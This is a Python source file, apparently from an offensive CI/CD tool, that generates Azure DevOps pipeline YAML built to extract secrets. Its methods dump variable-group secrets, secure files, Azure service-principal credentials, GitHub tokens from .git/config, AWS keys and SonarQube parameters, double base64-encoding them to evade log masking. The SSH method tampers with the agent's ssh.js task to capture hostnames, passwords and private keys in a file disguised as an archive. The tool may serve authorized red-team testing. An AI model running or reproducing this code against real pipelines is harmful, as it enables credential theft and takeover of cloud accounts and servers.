from nordstream.yaml.generator import YamlGeneratorBase
from nordstream.utils.constants import DEFAULT_TASK_NAME

class DevOpsPipelineGenerator(YamlGeneratorBase):
    taskName = DEFAULT_TASK_NAME

    def _get_base_template(self, poolName, os_type):
        pool = {"name": poolName} if poolName else {
            "vmImage": "windows-latest" if os_type.lower() == "windows" else "ubuntu-latest"
        }
        return {
            "pool": pool,
            "trigger": "none",
            "steps": []
        }

    def _get_ps_b64_script(self, fetch_logic):
        """Helper to wrap PowerShell variable fetching in Double Base64 encoding."""
        return f"""{fetch_logic}
if ($output) {{
    $output = $output.TrimEnd("`n", "`r")
    $base1 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
    $base2 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($base1))
    Write-Host $base2
    Write-Host ""
}}"""

    def generatePipelineForSecretExtraction(self, variableGroup, poolName=None, os="linux"):
        self._defaultTemplate = self._get_base_template(poolName, os)
        self._defaultTemplate["variables"] = [{"group": variableGroup.get("name")}]
        secrets = variableGroup.get("variables", [])

        if os == "windows":
            secretVars = ""
            for sec in secrets:
                key = f"secret_{sec}"
                value = f"$({sec})"
                secretVars += f"'{key}'=\"{value}\"\n"
            
            fetch_logic = f"""$secret_vars = @{{
{secretVars}
}}

$output = ""
$secret_vars.GetEnumerator() | ForEach-Object {{
    $output += "$($_.Key)=$($_.Value)`n" 
}}"""

            self._defaultTemplate["steps"].append({
                "task": "PowerShell@2",
                "displayName": self.taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": self._get_ps_b64_script(fetch_logic)
                }
            })
        else:
            env_vars = {f"secret_{sec}": f"$({sec})" for sec in secrets}
            self._defaultTemplate["steps"].append({
                "task": "Bash@3",
                "displayName": self.taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": "env -0 | awk -v RS='\\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0 ; echo ",
                },
                "env": env_vars,
            })

    def generatePipelineForSecureFileExtraction(self, secureFile, poolName=None, os="linux"):
        self._defaultTemplate = self._get_base_template(poolName, os)
        
        self._defaultTemplate["steps"].append({
            "task": "DownloadSecureFile@1",
            "name": "secretFile",
            "inputs": {"secureFile": secureFile},
        })

        if os == "windows":
            self._defaultTemplate["steps"].append({
                "task": "PowerShell@2",
                "displayName": self.taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": self._get_ps_b64_script('$output = Get-Content -Path "$(secretFile.secureFilePath)" -Raw')
                }
            })
        else:
            self._defaultTemplate["steps"].append({
                "script": "cat $(secretFile.secureFilePath) | base64 -w0 | base64 -w0; echo",
                "displayName": self.taskName,
            })

    def generatePipelineForAzureRm(self, azureSubscription, poolName=None, os="linux"):
        self._defaultTemplate = self._get_base_template(poolName, os)
        
        step = {
            "task": "AzureCLI@2",
            "displayName": self.taskName,
            "inputs": {
                "targetType": "inline",
                "addSpnToEnvironment": True,
                "scriptLocation": "inlineScript",
                "azureSubscription": azureSubscription,
            },
        }

        if os == "windows":
            step["inputs"]["scriptType"] = "pscore"
            step["inputs"]["inlineScript"] = self._get_ps_b64_script(
                '$output = (Get-ChildItem Env: | Where-Object Name -match "servicePrincipal" | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "`n"'
            )
        else:
            step["inputs"]["scriptType"] = "bash"
            step["inputs"]["inlineScript"] = 'sh -c "env | grep \\"^servicePrincipal\\" | base64 -w0 | base64 -w0; echo ;"'
            
        self._defaultTemplate["steps"].append(step)

    def generatePipelineForGitHub(self, endpoint, poolName=None, os="linux"):
        self._defaultTemplate = self._get_base_template(poolName, os)
        self._defaultTemplate["resources"] = {
            "repositories": [{
                "repository": "devRepo",
                "type": "github",
                "endpoint": endpoint,
                "name": "github/g-emoji-element",
            }]
        }
        
        self._defaultTemplate["steps"].append({"checkout": "devRepo", "persistCredentials": True})

        if os == "windows":
            self._defaultTemplate["steps"].append({
                "task": "PowerShell@2",
                "displayName": self.taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": self._get_ps_b64_script('$output = Get-Content -Path ".\\.git\\config" -Raw')
                }
            })
        else:
            self._defaultTemplate["steps"].append({
                "task": "Bash@3",
                "displayName": self.taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": 'sh -c "cat ./.git/config | base64 -w0 | base64 -w0; echo ;"',
                },
            })

    def generatePipelineForAWS(self, awsCredentials, poolName=None, os="linux"):
        self._defaultTemplate = self._get_base_template(poolName, os)

        if os == "windows":
            self._defaultTemplate["steps"].append({
                "task": "AWSPowerShellModuleScript@1",
                "displayName": self.taskName,
                "inputs": {
                    "awsCredentials": awsCredentials,
                    "scriptType": "inline",
                    "inlineScript": self._get_ps_b64_script(
                        '$output = (Get-ChildItem Env: | Where-Object Name -match "AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID" | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "`n"'
                    )
                }
            })
        else:
            self._defaultTemplate["steps"].append({
                "task": "AWSShellScript@1",
                "displayName": self.taskName,
                "inputs": {
                    "awsCredentials": awsCredentials,
                    "scriptType": "inline",
                    "inlineScript": 'sh -c "env | grep -E \\"(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)\\" | base64 -w0 | base64 -w0; echo ;"',
                },
            })

    def generatePipelineForSonar(self, sonarSCName, poolName=None, os="linux"):
        self._defaultTemplate = self._get_base_template(poolName, os)
        self._defaultTemplate["steps"].append({
            "task": "SonarQubePrepare@6",
            "inputs": {"SonarQube": sonarSCName, "scannerMode": "CLI", "projectKey": "sonarqube"},
        })

        if os == "windows":
            self._defaultTemplate["steps"].append({
                "task": "PowerShell@2",
                "displayName": self.taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": self._get_ps_b64_script(
                        '$output = (Get-ChildItem Env: | Where-Object Name -match "SONARQUBE_SCANNER_PARAMS" | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "`n"'
                    )
                }
            })
        else:
            self._defaultTemplate["steps"].append({
                "task": "Bash@3",
                "displayName": self.taskName,
                "inputs": {
                    "targetType": "inline",
                    "script": "sh -c 'env | grep SONARQUBE_SCANNER_PARAMS | base64 -w0 | base64 -w0; echo ;'",
                },
            })

    def generatePipelineForSSH(self, sshSCName, poolName=None, os="linux"):
        self._defaultTemplate = self._get_base_template(poolName, os)
        self._defaultTemplate["steps"].append({"checkout": "none"})

        if os == "windows":
            self._defaultTemplate["steps"].extend([
                {
                    "task": "PowerShell@2",
                    "continueOnError": True,
                    "inputs": {
                        "targetType": "inline",
                        "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; copy $p ($p+".bak"); (Get-Content -Path $p -Raw) -replace [regex]::Escape(\'const readyTimeout = getReadyTimeoutVariable();\'), \'const readyTimeout = getReadyTimeoutVariable();const fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("artefacts.tar.gz", data, (err) => {});\' | Set-Content -Path $p }',
                    },
                },
                {
                    "task": "SSH@0",
                    "continueOnError": True,
                    "inputs": {"sshEndpoint": sshSCName, "runOptions": "commands", "commands": "sleep 1"},
                },
                {
                    "task": "PowerShell@2",
                    "displayName": self.taskName,
                    "inputs": {
                        "targetType": "inline",
                        "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; mv -force ($p+".bak") $p ;}; $encodedOnce = [Convert]::ToBase64String([IO.File]::ReadAllBytes("artefacts.tar.gz"));$encodedTwice = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($encodedOnce));echo $encodedTwice; echo \'\'; rm artefacts.tar.gz;',
                    },
                },
            ])
        else:
            self._defaultTemplate["steps"].extend([
                {
                    "script": 'SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak ; sed -i \'s|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout = getReadyTimeoutVariable();\\nconst fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz", data, (err) => {});|\' $SSH_FILE',
                    "displayName": f"Preparing {self.taskName}",
                },
                {
                    "task": "SSH@0",
                    "continueOnError": True,
                    "inputs": {"sshEndpoint": sshSCName, "runOptions": "commands", "commands": "sleep 1"},
                },
                {
                    "script": "SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''; rm /tmp/artefacts.tar.gz",
                    "displayName": self.taskName,
                },
            ])